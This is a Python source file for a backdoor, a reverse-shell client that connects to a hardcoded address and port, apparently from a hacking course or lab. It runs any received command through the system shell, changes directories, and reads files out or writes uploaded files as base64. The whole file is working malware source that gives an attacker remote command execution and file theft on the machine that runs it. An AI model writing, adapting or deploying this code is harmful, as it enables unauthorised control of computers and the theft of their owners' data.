#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-]Error During Command Execution as you have entered an invalid command"

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Changing Working Directory to " + path
        except WindowsError:
            return "[-]Path may not exist or may have entered incorrectly"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:    # will allow us to read files as binary
                # Below Function will convert all unknown characters to known characters
                # example: Without base64 encoding you can read/write that is download any text file that can be any type like .py, .java, .cpp etc.
                # but the same cannot be done when downloading images as they use different encoding.
                return base64.b64encode(file.read())
        except IOError:
            return "[+] File Name does not exist."
        except TypeError:
            return "[+] File Name does not exit"
        
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(command [1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.43.198", 5555)
my_backdoor.run()
